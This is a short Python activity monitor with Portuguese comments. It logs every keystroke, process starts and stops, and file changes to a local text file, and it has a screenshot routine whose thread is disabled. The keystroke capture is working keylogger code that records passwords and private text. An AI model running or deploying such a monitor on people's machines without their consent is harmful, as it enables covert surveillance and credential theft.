import os
import time
from datetime import datetime
from pynput import keyboard
import pyautogui
import psutil
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from threading import Thread

log_file = "activity_log.txt"
screenshot_folder = "screenshots"

screenshot_timer = 1
logfile_timer = 5

# Certifique-se de que o diretório de capturas de tela existe
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

# Função para gravar no arquivo de log
def log_data(data):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} - {data}\n")

# Monitoramento de teclas pressionadas
def monitor_keys():
    def on_press(key):
        try:
            log_data(f"Key Pressed: {key.char}")
        except AttributeError:
            log_data(f"Special Key Pressed: {key}")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Monitoramento de processos ativos e mudanças
def monitor_processes():
    active_processes = set()
    while True:
        current_processes = {proc.info['name'] for proc in psutil.process_iter(['name'])}
        new_processes = current_processes - active_processes
        closed_processes = active_processes - current_processes

        for proc in new_processes:
            log_data(f"Process Started: {proc}")
        for proc in closed_processes:
            log_data(f"Process Closed: {proc}")

        active_processes = current_processes
        time.sleep(5)

# Captura periódica de tela
def capture_screenshots(interval=screenshot_timer):
    while True:
        screenshot = pyautogui.screenshot()
        filename = os.path.join(screenshot_folder, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        screenshot.save(filename)
        time.sleep(interval)

# Monitoramento de alterações em arquivos
class FileChangeHandler(FileSystemEventHandler):
    def on_modified(self, event):
        log_data(f"File Modified: {event.src_path}")
    def on_created(self, event):
        log_data(f"File Created: {event.src_path}")
    def on_deleted(self, event):
        log_data(f"File Deleted: {event.src_path}")
    def on_moved(self, event):
        log_data(f"File Moved: from {event.src_path} to {event.dest_path}")

def monitor_file_changes(path="."):
    event_handler = FileChangeHandler()
    observer = Observer()
    observer.schedule(event_handler, path, recursive=True)
    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

# Executar monitoramento
if __name__ == "__main__":
    # Certifique-se de que o arquivo de log existe
    if not os.path.exists(log_file):
        with open(log_file, "w") as f:
            f.write("Activity Log\n")

    # Iniciar monitoramento em threads
    Thread(target=monitor_keys, daemon=True).start()
    Thread(target=monitor_processes, daemon=True).start()
    # Thread(target=capture_screenshots, daemon=True).start()
    Thread(target=monitor_file_changes, daemon=True, args=(".",)).start()

    # Manter o script rodando
    while True:
        time.sleep(1)
